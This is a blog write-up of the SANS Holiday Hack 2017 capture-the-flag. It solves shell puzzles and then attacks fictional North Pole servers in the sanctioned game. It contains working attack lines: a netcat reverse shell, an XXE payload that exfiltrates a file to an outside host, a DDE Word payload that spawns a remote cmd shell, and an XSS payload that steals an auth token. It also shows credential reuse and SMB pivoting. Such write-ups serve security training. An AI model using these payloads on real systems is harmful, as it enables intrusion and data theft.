---
title: "SANS Holiday Hack 2017 Writeup"
slug: "sans-holiday-hack-2017-writeup"
author: "ropnop"
date: 2018-01-18
summary: "The SANS team hit another homerun with the HHC including awesome challenges that mimicked real-world pentest activities. Here's my solutions!"
toc: true
share_img: "/images/2018/01/Holiday-Hack-Challenge-2017.png"
tags: ["sans","writeup","pentest","holidayhack"]
series: ["SANS Holiday Hack Write-ups"]
---

# Intro
After having so much fun with the Holiday Hack [last year](https://blog.ropnop.com/sans-holiday-hack-2016-writeup/), I was eagerly awaiting the 2017 Holiday Hack and the SANS crew did not disappoint. While I didn't enjoy the minigames as much this year, I thought the collection of web app vulns and client side exploitation in this year's challenge was fantastic.

After about two weeks of off-and-on playing and squeezing time between family visits for the holiday, I ended up solving all of the technical challenges, answered all the main questions, and finished with a final score of 77/85. I ended up not completing all the mini-game accomplishments - but I wouldn't be sure how to write those up anyway! 

So here is my walkthrough for solving all the terminal challenges and recovering all the pages of the great book. Note: I' sure there are other ways for solving some of these so I can't wait to read how others did it!

The challenge started here: https://holidayhackchallenge.com/2017/

# Part 1 - Cranpi Terminals
To get the first page of the Great Book, I needed to solve some of the minigame puzzles. To make them easier, I went through each level and unlocked all of the tools by beating each of the 7 CranPi challenges. These were super-fun little "mini-challenges" that I really enjoyed. I'll write up my solution for each of them:

## Winter Wonder Landing
This challenge starts out seemlingly pretty easy: find and run the "elftalkd" binary.
![Winter Wonder Landing Challenge](/images/2018/01/winter_wonderland_1.PNG)

Since I didn't know where the binary is located, the easiest tool to use to discover it would be `find`, but I quickly discovered something was wrong with the binary:
![Find Doesn't Work](/images/2018/01/winter_wonderland_find_failed.png)

Looking at some file information on it, I can see it's an ARM64 binary, which won't run on this x64 machine.

The other thing I noticed is that `find` is located at `/usr/local/bin/find`, which is a non-standard location for it. 

When I'm on an unfamiliar and/or limited system and want to see all the commands available to me, a great tool to use is [compgen](https://www.gnu.org/software/bash/manual/html_node/Programmable-Completion-Builtins.html). Using `compgen -c` it's possible to see every single command I could tab-complete to (which is usually populated by things in my current PATH). Looking at the output of `compgen -c` and grepping for find shows there's actually a few `find` binaries in my PATH:

![Multiple finds](/images/2018/01/winter_wonderland_compgen_find.png)

Working my way through the PATH locations, I found another `find` binary inside /usr/bin that worked fine. I could now use that one to search for the `elftalkd` file by running the following to look for all files that contain "elftalkd" starting in the root directory (and not displaying errors):

```bash
/usr/bin/find / -type f -iname '*elftalkd*' 2>/dev/null
```

One result was found at: `/run/elftalk/bin/elftalkd`, and running that command completed the challenge.

## Winconceivable: The Cliffs of Winsanity
This challenge sounds straightforward as well: just kill a process:
![Just kill a process](/images/2018/01/winconceivalbe_start.png)

After discovering the PID with `ps aux | grep santa`, I simply tried to forcibly kill with `kill -9`, but nothing happened. No output and the process was still running.

It was very odd behavior, since there should be *something* returned. Running `kill` with no arguments or with incorrect argurments should at least display an error, but that wasn't happening either. I looked where the `kill` binary was with `which`, and calling that binary with it's full path worked. That's when I realized that `kill` was an alias. Running `alias kill` showed me that the `kill` command was actually just aliases to the `true` binary!

![which kill and alias](/images/2018/01/winconc_kill_output.PNG)

Calling `kill` by it's complete path (/bin/kill) worked fine, and I was able to kill the process by:

```
/bin/kill -9 <PID>
```

After a page refresh the challenge was beaten.

## Cryokinetic Magic
Another seemingly easy task made complicated. All this challenge asked is to execute `CandyCaneStriper`, but the file was marked non-executable, and `chmod` is borked and doesn't work.

![Cryokinetic info](/images/2018/01/cryo_file_info.png)

My initial strategy was to see if I could find out another way to implement `chmod` functionality and mark the file as executable, but then I found some of the Elves' Twitter accounts, which had very useful info. A tweet thread from @GreenesterElf outlined the problem and a potential solution: [Can I execute a Linux binary without the execute permission bit being set?](https://superuser.com/questions/341439/can-i-execute-a-linux-binary-without-the-execute-permission-bit-being-set). 

This was really interesting to me and I read up some more on ld.so and ld-linux.so in their [man page](http://man7.org/linux/man-pages/man8/ld.so.8.html) and this great article, [How programs get run: ELF binaries](https://lwn.net/Articles/631631/).

Since I already saw from the output of `file` that CandyStriper is an ELF binary, and that the interpreter is at `/lib64/ld-linux-x86-64.so.2`, it was possible to call `ld.so` with the ELF binary and execute the program:

![Exeucting with ld.so](/images/2018/01/cryo_executed.png)

## There's snow place like home
In this challenge I had to execute a binary that wasn't working. When trying to execute the file, an error was thrown: "Exec format error". Using `file` the problem became obvious: the binary was compiled for ARM but I was running in x86_64:

![ARM binary in x86_64](/images/2018/01/snowplace_arm_binary.png)

Fortunately, another tweet from an Elf gave a good hint about using `qemu`.

I used `compgen` to see what qemu commands were available to me and found `qemu-arm` was installed:

![Compgen for qemu](/images/2018/01/snowplace_qermu_arm.png)

This program let me emulate the ARM binary on the system and execute it to solve the challenge:

```
$ qemu-arm trainstartup
```

## Bumble's Bounce
A challenge that didn't involve running a binary! This was was about parsing an HTTP access log and discovering the least-popular browser. Looking at the first few lines of the access.log with `head` I could see this was a pretty standard Apache access log, with a few different fields:

![Access log format](/images/2018/01/bumble_access_log.png)

The field I was most interested in was the User-Agent field which identifies the browser. To solve this, I needed to extract the User-Agent for every single line in the log, count unique entries and reverse sort the count to see the least-popular browser.

I've actually had to do this several times and I've always used a combination of `awk`, `sort` and `uniq` to accomplish it. There's a great article [here](http://www.the-art-of-web.com/system/logs/) on using `awk` with Apache access logs that's a great reference.

*Sidenote: I seriously can not stress enough how useful text manipulation tools are to a pentester. I can't even imagine the amount of time that a nice use of `awk` or `sed` has saved me make me. I honestly think they are probably the most important tools in my arsenal when used efficiently and correctly. And I'm [not the only one](https://bluescreenofjeff.com/2016-07-26-finding-diamonds-in-the-rough-parsing-for-pentesters/)*


Since the User-Agent field was always in quotes, I decided to use `awk` with a field delimeter of quotation marks. This makes the User-Agent field number 6. Printing that field and then piping it to sort creates an alphabetical lits of User-Agents. Piping that result to `uniq -c` creates a list of the number of occurences of each unique User-Agent, and then finally `sort -r` will sort that list in descending order:

```
awk -F\" '{print $6}' access.log| sort |uniq -c|sort -r
```

At the very bottom of that list I saw a User-Agent with exactly one request that was the correct answer: "Dillo/3.0.5".

## I don't think we're in Kansas anymore
In this challenge we're asked to identify the most popular song from a SQLite database with two tables: "likes" and "songs". The catch is that the "likes" table uses a foreign key reference to the "songs" table.

I started by exploring the database tables and schemas with the command line `slite3` tool:

```
elf@ed8b2cae8e8f:~$ sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite> .tables
likes  songs
sqlite> .schema likes
CREATE TABLE likes(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY(songid) REFERENCES songs(id)
);
sqlite> .schema songs
CREATE TABLE songs(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
);
```

I decided to simply focus on the "likes" table to determine the most common "songid" in there. That would tell me the most liked song, and I could then just look up the song's name in the other table.

To find the most common songid, I used sqlite's [count(*) function](http://www.sqlitetutorial.net/sqlite-count-function/):

```
sqlite> select songid, count(*) from likes group by songid order by count(*) desc;
```

This gave me the songid that appeared the mots times in the "likes" table: 392 (with 11325 likes)

![Count of songid](/images/2018/01/kansas_songid_count.png)

Then it was just a simple lookup of the id in the "songs" table to get the answer:

![Select song title](/images/2018/01/kansas_song_title.png)

## Oh wait, maybe we are
This was a fun challenge that required reading up a bit more on sudo. The goal was to restore the contents of `/etc/shadow` with `/etc/shadow.bak`, even though both files were protected and I seemingly didn't have permissions.

The hint on the challenge said to look what commands I could run with sudo, so I ran `sudo -l` to see:

![Sudo commands](/images/2018/01/ohwait_sudo_commands.png)

Great! It looks like I could run the `find` command without a password with sudo - which actually allows me to execute arbitrary commands. However, the syntax looked a little different than what I was used to and sure enough, trying to run `sudo find` prompted me for a password and didn't work. The `(elf : shadow)` part was confusing to me.

The syntax for defining sudo permissions is available in the man pages, so I started browsing `man suoders` and found this snippet about "Runas_Spec":

![Sudo runas](/images/2018/01/ohwait_sudoers_man.png)

This was new to me and I'm glad I learned about it. Through `/etc/sudoers`, an admin can grant permissions to users to run commands, but force them to run the command as a specific user or group.

In the challenge, the sudo permission is basically saying that the user elf can run `find`, but only as the user "elf" *and* under the context of the "shadow" group.

It is possible to run a sudo command as another user ("-u") or group ("-g"), so to run find with root permissions, I had to run it as `sudo -g shadow /usr/bin/find`

Putting it all together, I wrote a one-line find command that "finds" /etc/shadow, then executes a copy command to overwrite it with a copy of /etc/shadow.bak:

```
sudo -g shadow /usr/bin/find /etc/shadow -exec cp /etc/shadow.bak {} \;
```

## We're off to see the...
The last terminal challenge made use of a really cool attack that I had read about but hadn't ever had the opportunity to use before: LD_PRELOAD hijacking. The challenge was to run the binary `isit42` and make it return, uh, 42. A snippet of the source code was included as well:

![isit42 source code](/images/2018/01/wereofftosee_source.png)

One of the hints pointed to this great blogpost by SANS on using [LD_PRELOAD for the win](https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win), which was exactly how to solve this one.

Now I'm no expert, but basically, LD\_PRELOAD is a feature of Linux's dynamic linker that lets the user specify shared libraries to be loaded before system libraries. When the `isit42` binary is loaded and run, the dynamic linker will "link" the binary with the necessary system calls it needs to execute - which in this case includes the call the `rand()` function. With LD\_PRELOAD, I can specify a *different* `rand()` to be loaded and called - which I can control to return anything. The only trick is to make sure the return type and parameters match exactly what is expected, whch the comment in the source code helpfully points out.

But what did I want my `rand()` to return? The source code for `isit42` takes the output of rand and does a modulo with 4096. I wanted the resut of *that* to be 42. I wrote a stupid simple Python program to spit out the first reverse-modulo of 42 with 4096:

```python
for i in range(0,4096):
    if i % 4096 == 42:
        print i
        break
```

Turns out, `42 % 4096` is 42, so that is what I wanted my "rand" to return.

So to compile my own `rand()` function, I wrote `hax.c`:

```c
#include <stdio.h>

int rand(void) {
    return 42;
}
```
Now I had to compile a position independent library with gcc:

```
gcc hax.c -o hax -shared -fPIC
```

With that compiled, I just pointed LD_PRELOAD to the absolute path of my new library and the challenge was solved:

```
LD_PRELOAD="/home/elf/hax" ./isit42
```

## Answer to Question 1
> Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

**The title of the first page was "About This Book"**

# Letters To Santa
With the terminal challenges out of the way, I turned my effort to the next question, which pointed me to the "Letters to Santa" application at https://l2s.northpolechristmastown.com/

The hints I unlocked doing the terminal challenges here very helpful throughout the rest of the Holiday Hack, and the hints from Sparkle Redberry pointed towards a "development server" and an Apache Struts exploit.

One of the first things I did after loading the page was peruse through the source code, which immediately pointed me to a separate "dev" instance in a hidden href:

![L2S Dev Link](/images/2018/01/l2s_dev.png)

This dev link redirected to https://dev.northpolechristmastown.com/orders.xhtml, which was "under development" and helpfully pointed out that it was powered by "Apache Struts":

![l2s dev struts](/images/2018/01/l2s_dev_struts.png)

The [blog post](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code) referenced in the hint pointed to a customized, weaponized Apache Struts exploit written in Python: https://github.com/chrisjd20/cve-2017-9805.py

Using this exploit code, it's possible point it at the orders.xhtml page on the dev server and get command execution. The one tricky thing about this exploit is that it is "blind" - there's no output returned from the server so it can be difficult to see if it it's working. When I'm faced with a situation like that, one of the easiest techniques is to try to curl a non-existent file from a VPS I control and see if I see anything in the access logs:

![l2s struts curl command](/images/2018/01/l2s_curl_success.png)

Awesome, it's working! Now what I really want is an [interactive shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). I set up a `socat` listener on my VPS:

```
socat tcp-l:4444,reuseaddr -,raw,echo=0,escape=0x07
```

and shot over a PTY shell with netcat using the "script /dev/null" trick (I got lucky guessing that `nc` was installed):

```
nc -c 'SHELL=/bin/bash script -q /dev/null' foobar.example.com 4444
```

And it worked! I now had a bash session* on the vulnerable struts server:

![Socat catching bash](/images/2018/01/l2s_socat_rbash.png)

From my new shell, I cd'd to the webroot `/var/www/html` and found the next page of the Great Book:

![ls webroot](/images/2018/01/l2s_bash_webroot.png)

The second page of the book was in the webroot here: https://l2s.northpolechristmastown.com/GreatBookPage2.pdf

**Alabaster's password**

The next part of the question asked me to find Alabaster's password. To find plaintext passwords on a system, the best tool for the job is [find](https://twitter.com/ropnop/status/877555905105203200). Except `find` didn't work....

![rbash - doh!](/images/2018/01/l2s_rbash.png)

That's when I discovered that I actually had a restricted bash (rbash) shell. Alabaster's entry in `/etc/passwd` had his login shell set to `/bin/rbash`:

```
alabaster_snowball:x:1003:1004:Alabaster Snowball,,,:/home/alabaster_snowball:/bin/rbash
```
But wait...I didn't interactively log in - I executed /bin/bash through a command injection, so that shouldn't matter! Then I saw the reason in `/home/alabaster_snowball/.bashrc`:

```
# HHC
bind 'set disable-completion on'
unset HISTFILE
alias nano="rnano"
alias vim="rvim"
alias vi="rvim"
HOMEDIR=$(mktemp -d /tmp/asnow.XXXXXXXXXXXXXXXXXXXXXXXX)
export PATH="/usr/local/rbin"
cd "$HOMEDIR"
```
Executing `/bin/bash` sourced .bashrc and set my PATH to `/usr/local/rbin`. So it was actually just my PATH that was screwed up. I could still call `/usr/bin/find` just fine.

So where to look for the password? Config files and source code are gold mines, so I started exploring the server to see what I could find. That's when I discovered that Apache Tomcat was installed and present in `/opt/apache-tomcat`, so I focused my efforts there:

```
cd /opt/apache-tomcat
/usr/bin/find . -type f -exec grep -i -l password {} /dev/null  \;
```

This command recursively searched and listed all files that contained the word "password". It spit out some files, searching a *.class file which yielded me a password for a MySQL database:

```
grep -i password ./webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
```

![l2s alabaster's password](/images/2018/01/l2s_alabasters_password.png)

Since one of the hints mentioned that Alabaster likes to re-use passwords, I tried it with SSH and it worked!

![l2s ssh access](/images/2018/01/l2s_ssh.png)

Now this *definitely* was an rbash session, but that's all the access I needed at this point, so I didn't bother trying to escape.

## Answer to Question 2

> 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

**The 2nd page was "On the Topic of Flying Animals" and Alabaster's password is "stream\_unhappy\_buy\_loss"**

# SMB Server
All the next challenges required being able to pivot into the "internal" network through the access I gained above. Pivoting through SSH is very easy with dynamic port forwards. 

From my VPS, I SSH'd into l2s with a dynamic port forward on 9090:

```
ssh -D 9090 alabaster_snowball@l2s.northpolechristmastown.com
```

Once I had the dynamic port forward set up, I could use the awesome [proxychains](https://blog.techorganic.com/2012/10/10/introduction-to-pivoting-part-2-proxychains/) tool to proxy my network traffic through the tunnel. I installed proxychians (`sudo apt-get install proxychains`) and edited `/etc/proxychains.conf` to create a socks4 proxy through the dynamic port forward set up by SSH:

```
socks4  127.0.0.1 9090
```

To discover an SMB server on the internal subnet, I ran an nmap discover scan looking for port 445 open. Running port scans through proxychains is slow and gives best results with "full TCP" scans (-sT) but eventually I found a server with port 445 open (proxychains responded with "OK")

```
proxychains nmap -n -Pn -PS445 -sT -p445 10.142.0.1/24
```

![Proxychains nmap output](/images/2018/01/proxychains_nmap.png)

Once I had the server identified (10.142.0.7), I used the command line tool `smbclient` to access the server and list the shares with Alabaster's credentials:

```
proxychains smbclient -L 10.142.0.7 -p 445 -U alabaster_snowball%stream_unhappy_buy_loss
```

![Proxychains smb list](/images/2018/01/proxychains_smb_list.png)

The share "FileStor" was probably what I was looking for, so I connected to it with smbclient and used a series of commands to recursively download every file on it:

```
$ proxychains smbclient //10.142.0.7/FileStor -p 445 -U alabaster_snowball%stream_unhappy_buy_loss
ProxyChains-3.1 (http://proxychains.sf.net)
WARNING: The "syslog" option is deprecated
|S-chain|-<>-127.0.0.1:9090-<><>-10.142.0.7:445-<><>-OK
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

This got me every file on the SMB share, including GreatBookPage3.pdf

## Answer to Question 3
> The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?

**hhc17-smb-server.c.holidayhack2017.internal**

# Elf Web Access
For the next challenges, I decided to switch from using my VPS to setting up my local machine so I could use a browser. The set up I went with was to use Putty to do dynamic port forwarding, then proxy FireFox to Burp Suite, and tell Burp Suite to use an upstream socks proxy (the SSH dynamic port forward on localhost). I also told Burp to perform DNS lookups through the socks proxy:

![Burp socks proxy](/images/2018/01/burp_socks_proxy.png)

The end result was that I could browse and do all my web app testing from Firefox on my local machine, while capturing requests and being able to tamper with them in Burp:

![ewa with foxyproxy](/images/2018/01/ewa_foxyproxy.png)

Unfortunately, Alabaster's password didn't work on the mail server, so I had to figure something else out. First, I noticed that robots.txt had an entry for "/cookie.txt" which contained some source code explaining how Alabaster was encrypting the cookies: http://mail.northpolechristmastown.com/cookie.txt

The hint from Pepper Minstix was also a huge help:
> AES256? Honestly, I don't know much about it, but Alabaster explained the basic idea and it sounded easy. During decryption, the first 16 bytes are removed and used as the initialization vector or "IV." Then the IV + the secret key are used with AES256 to decrypt the remaining bytes of the encrypted string.
> Hmmm. That's a good question, I'm not sure what would happen if the encrypted string was only 16 bytes long.

Looking in Burp, I could see that a cookie was set when I visited the site:

```
Set-Cookie: EWA={"name":"GUEST","plaintext":"","ciphertext":""}
```

The source code indicated that "plaintext" was supposed to be set to 5 random characters, and "ciphertext" was the plaintext encrypted with the secret key. But like Pepper Minstix said, what would happend if the plaintext was blank and the ciphertext was only 16 bytes long? Well the decryption routine would read the first 16 bytes as the IV, combine it with the key and decrypt the rest of the ciphertext (which is blank since there's no more bytes left to decrypt). Since it's blank, it would match a blank plaintext every time!

Since I knew that an MD5 hash is alwasy exactly 16 bytes long, I used Burp decoder to create a base64 encoded MD5 hash:

![Burp md5 hash](/images/2018/01/ewa_16byte_cipher.png)

I then used a Firefox extension to set my EWA cookie to the following value:

```
{"name":"alabaster.snowball@northpolechristmastown.com","plaintext":"","ciphertext":"BcEqKHM0OGyUExq4qgDQig=="}
```

![EWA edit cookies](/images/2018/01/ewa_edit_cookies.png)

After saving the new cookie value and reloading the page, I was greeted with Alabaster's inbox!

![EWA inbox](/images/2018/01/ewa_inbox.png)

Reading some of his emails, I found the link to the next Great Book Page:

![EWA great book page](/images/2018/01/ewa_greatbook_page.png)

## Answer to Question 4
> Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?

**The Great Book page is located at http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf and is about the Lollipop Guild.**

# North Pole Police Department
To answer question 5, there was no exploitation involved, just good old fashioned data mining. I'm slighly embarassed to say this section probably tooke me the longest and I saved it for last. Guess I'm more of a hacker than a data scientist (although I do work for a big data company...)

To solve this challenge, I needed three pieces of data. The first was the "Naughty and Nice List" in CSV format that I found on the SMB file server. The second was a "Munchkin Mole Report" on the same SMB server, and the third was a list of all the infractions from http://nppd.northpolechristmastown.com/infractions

To get a list of all the infractions from that page, I entered a wildcard query: "status=*" and hit the download button. This gave me an "infractions.json" file which contained an array of every infraction in JSON format.

To find the number of infractions required to be "Naughty", I had to combine the data from the CSV list and the JSON data. I used Python to iterate through the data a few times and create new dictionary with names as keys. Each enty in the dictionary looked like the following:

```
all_data['Abdullah Lindsey'] = {'status': 'Nice', 'infractions': [{u'status': u'pending', u'severity': 3.0, 'n
n': 'Nice', u'title': u'Throwing rocks (non-person target)', u'coals': 3, u'date': u'2017-03-09T10:19:28', u'nam
e': u'Abdullah Lindsey'}, {u'status': u'closed', u'severity': 5.0, 'nn': 'Nice', u'title': u'Naughty words', u'c
oals': 5, u'date': u'2017-06-28T12:04:04', u'name': u'Abdullah Lindsey'}], 'total_infractions': 2, 'total_coal':
 8}
```

 Then I just looked at the minimum number of infractions for "Naughty" people and the maximum number of infractions for "Nice" people.

 To find the 6 moles, the hint was located in the "Munchkin Mole Report" memo. When the moles tried to escape, they "pulled hair" and "threw rocks". I iterated through my dictionary and extracted every person who had infractions for *both* "pulling of hair" and "throwing rocks".

 My entire Python script is here:
{{<gist ropnop baf859e61fbad6df1623fb206786731a>}}

 Running the script gave me the answers I needed:
```
$ python find_moles.py
Max infractions for nice people: 3
Min infractions for naughty people: 4
Found 6 potential moles:
        Nina Fitzgerald
        Beverly Khalil
        Christy Srivastava
        Kirsty Evans
        Isabel Mehta
        Sheri Lewis
```

## Answer to Question 5
> How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

* **Four Infractions are required**
* **Insider Moles: Nina Fitzgerald, Beverly Khalil, Christy Srivastava, Kirsty Evans, Isabel Mehta, Sheri Lewis**
* **The Abominable Snowman is throwing the snowballs, based on my conversation with Bumble and Sam:**

![Abominable snowman](/images/2018/01/abominable_snowman.png)

# Elf as a Service
I was really happy to see this challenge, since it required one of my favorite vulnerabilities to exploit: XML eXternal Entity (XXE) Injection. Since I first exploited one of these vulns years ago, I've seen this so much in the wild and it's always so satisfying to pop.

The challenge was to read a local file at "C:\greatbook.txt" and it started at the new Elf as a Service (EaaS) platform at: http://eaas.northpolechristmastown.com/

The platform accepts orders as XML files that are uploaded to the server. A template of the order file is available from the main page here: http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml

Order's can be uploaded on http://eaas.northpolechristmastown.com/Home/DisplayXML

First, I downloaded the sample XML file, prettified it and uploaded it as new order to see the request in Burp:

![Upload orig order](/images/2018/01/eaas_orig_upload.png)

It's uploading a complete XML document, which is a great sign that including a DOCTYPE might be possible and therefore maybe XXE Injection.

I went with a standard entity expansion attack. There's some great resources on this attack on the [SANS Blog](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities/) and there's an awesome list of test payloads on [GitHub here](https://gist.github.com/staaldraad/01415b990939494879b4)

I defined a DOCTYPE for the document "Elf" with an external entity called "sp" pointing to http://do.ropnop.com/ev.xml

The contents of ev.xml defined a few more entities: "data" which was file entity pointing to "c:/greatbook.txt", and "param1", which created an entity "exfil" which nexted "data" in a URL request back to my VPS on port 4444:
```xml
<!ENTITY % data SYSTEM "file:///c:/greatbook.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://do.ropnop.com:4444/?%data;'>">
```
*Cue Inception theme song*

In my XML order, I called expanded all the entities which resulted in a GET request back to my VPS containing the contents of greatbook.txt. The final order looked like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Elf [
<!ELEMENT ElfName ANY>
<!ENTITY % sp SYSTEM "http://do.ropnop.com/ev.xml">
%sp;
%param1;
]>
<Elf>
    <Elf>
        <ElfID>1</ElfID>
        <ElfName>&exfil;</ElfName>
        <Contact>8675309</Contact>
        <DateOfPurchase>11/29/2017 12:00:00 AM</DateOfPurchase>
        <Picture>1.png</Picture>
        <Address>On a Shelf, Obviously</Address>
    </Elf>
...more data...
```

This looks confusing, but really a couple of things happen sequentially that clears it up:

* I add a DOCTYPE declaration (`<!DOCTYPE Elf [`)
* I define an external entity called "sp" that points to valid XML on my server (`<!ENTITY % sp SYSTEM "http://do.ropnop.com/ev.xml">`)
* I then tell the parser to fetch and "execute" the "sp" entity (`%sp;`). This is what actually initiates the first request to my server
* The parser then fetches and "executes" the "ev.xml" file, which defines the "data" entity as the local file "c:/greatbook.txt"
* It also defines the "param1" entity (which is just a string of more valid XML at this point)
* I then "execute" the "param1" entity (`%param1;`), which then defines the "exfil" entity. Since "data" was already defined as the contents of "greatbook.txt", it substitutes the contents of the file into the string
* Finally, I "execute" the final entity "exfil" (`&exfil;`), which makes one final request to my server with the contents of "file" in the URL string. This file doesn't exist so nothing happens after this, but I capture the request in my request log.

*Note: "execute" is really the wrong word when talking about XML Parsing, but it makes the most sense to me to think of it that way. Also, this will only work if the contents of the file don't contain illegal URL characters (which thankfully it doesn't)* 

I used Burp repeater to send the final payload:
![Malicious order.xml](/images/2018/01/eaas_malicious.png)

And on my netcat listener on my VPS I got the contents of the file:

![XXE Data Retrieval](/images/2018/01/xxe_data_in_request.png)

The contents of the file disclosed the URL for the next page of the great book: http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf

## Answer to Question 6
> The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?

**The title of page 6 is "The dreaded inter-dimensional tornadoes"**

# Elf-Machine Interfaces
Despite the question for this challenge mentioning "complex SCADA systems", this really only involved some Windows client-side exploitation through a DDE attack in a Microsoft Word document. The hints for this challenge from Shinny Upatree mention that Alabaster has Microsoft Office installed, and discusses using the "Dynamic Data Exchange features for transferring data between applications and obtaining data from external data sources, including executables."

Using DDE payloads to get code execution through MS Office documents was a pretty big story a few months back, and quickly made its way into every pentester's bag of tricks. There's a great [blogpost here](https://null-byte.wonderhowto.com/how-to/hide-dde-based-attacks-ms-word-0180784/) outlining how to hide DDE payloads in a Word Document.

Reading through Alabaster's email gave two big hints to help with this challenge as well. First, he would open *any* DOCX file that contained the words "gingerbread cookie recipe":

![Email open docx](/images/2018/01/email_open_docx.png)

And secondly, he told the elves that he had installed netcat into his Windows PATH:

![Email nc installed](/images/2018/01/email_nc_path.png)

Now normally with a DDE exploit I would try to launch a post-exploitation agent like Meterpreter or Empire through a download cradle, but since netcat was installed I decided to keep it simple and just execute a dumb reverse shell with nc.exe and the "-e" option.

I opened up a blank Word Document, added the words "gingerbread cookie recipe" then inserted a blank field (Ctrl+F9) and put my DDE payload in:

```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k nc.exe foobar.ropnop.com 4444 -e cmd.exe" } 
```

I named the document "gingerbread\_cookie\_recipe.docx" and navigated back to Email server. I forged a cookie for "wunorse.openslae@northpolechristmastown.com" and sent an email to Alabaster with the file attached. The POST request looked like this:

![Email payload to Alabaster](/images/2018/01/email_send_payload.png)

After a few minutes, my listener on the VPS caught the shell!

![DDE caught shell](/images/2018/01/dde_caught_shel.png)

Looking in his Documents directory, I saw the file I needed: GreatBookPage7.pdf. Now I just needed to get the file on the server. There's many ways to [transfer files](https://blog.ropnop.com/transferring-files-from-kali-to-windows/) from the Windows command line, but I went with what I think is the easiest: SMB.

I used Impacket's [smbserver.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbserver.py) on my VPS to set up an open share called HAX:

```
python examples/smbserver.py HAX /root/hax/
```

Then, from my Windows command shell, I used the native `copy` command with a UNC path to copy the file over:

```
copy GreatBookPage7.pdf \\foobar.ropnop.com\HAX\
```

![SMB Copy File](/images/2018/01/smb_copy_file.png)

My server caught the file (and Alabaster's hash!) and I had the page I needed:

![SMB Receive file](/images/2018/01/smb_receive_file-1.png)

## Answer to Question 7
> Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?

**The GreatBookPage7.pdf file describes "The Witches of Oz"**

# Elf Database
The final challenge was the most challenging and fun to solve IMO. It started at a login page at http://edb.northpolechristmastown.com/home.html and some hints from Wunorse Openslae about XSS, Json Web Tokens, and LDAP Injection.

## Part 1 - XSS
The first thing I set about doing was to discover the hinted-at XSS vulnerabilty. There was a password reset functionality that allowed custom messages to be sent. I sent my favorite XSS payload (short and sweet):

```
<svg/onload=alert(1)>
```

And it worked!

![EDB XSS 1](/images/2018/01/edb_xss_1.png)

Now that I had a PoC working, I needed to come up with a way to hijack a valid session and bypass the login page. At first it seemed obvious to me that since the SESSOIN cookie was missing the HttpOnly flag that I could just steal the session cookie of a logged in user and re-use it. But looking closer at the source code on the login page, I realized that authentication *actually* relied on something called "np-auth":

![EDB Login Source](/images/2018/01/edb_login_source.png)

This code first checked for the existence of *any* cookie. If a cookie existed, it then pulled a value from browser localStorage called "np-auth" and POSTed it to "/login" (if it existed). I was able to verify this by setting a dummy value in localStorage through the browser's developer console (`localStorage.setItem("np-auth", "foobar")`) and saw the POST request and response in Burp:

![EDB Post Auth Foobar](/images/2018/01/edb_post_auth.png)

So in order to hijack a session, I needed my XSS payload to steal the logged in user's "np-auth" token from browser localStorage, then send it back to me somehow. This is easy to accomplish all in JS, and the easiest way to send it to myself is just through a URL parameter. I constructed a XSS payload that executed the following JS snippet:

```js
window.location='http://foobar.ropnop.com/cookie?auth='+localStorage.getItem('np-auth')
```

This would redirect the browser to a URL containing the complete value of "np-auth" and I could see it in my request logs. My final XSS payload looked like this:

```
hello+<svg/onload="window.location='http://foobar.ropnop.com/cookie?auth='%2blocalStorage.getItem('np-auth')">
```
I sent this in a password request message and caught the auth-token in a GET request to my VPS:

![np-auth in request](/images/2018/01/edb_npauth_request.png)

Now I had a proper np-auth token!
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
```
I immediately tried submitting it in a POST request, and to my dismay it did not work. I needed to do a little more work...

## Part 2 - JWT Cracking
